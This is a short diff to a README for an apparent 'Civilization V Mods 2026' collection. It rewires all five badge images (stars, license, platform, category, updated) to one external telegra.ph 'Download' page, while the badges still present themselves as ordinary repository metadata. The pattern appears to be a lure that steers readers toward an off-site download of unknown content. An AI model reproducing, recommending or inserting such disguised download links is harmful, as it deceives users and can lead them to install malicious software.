@@ -1,10 +1,10 @@
 # 🎮 Civilization V Mods 2026 — Best Mods Collection & Ultimate Pack
 
-[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Civilization-V)]()
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)]()
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)]()
-[![Category](https://img.shields.io/badge/Category-Modding-orange)]()
-[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)]()
+[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Civilization-V)](https://telegra.ph/Download-05-21-39)
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://telegra.ph/Download-05-21-39)
+[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)](https://telegra.ph/Download-05-21-39)
+[![Category](https://img.shields.io/badge/Category-Modding-orange)](https://telegra.ph/Download-05-21-39)
+[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)](https://telegra.ph/Download-05-21-39)
 
 ---
 
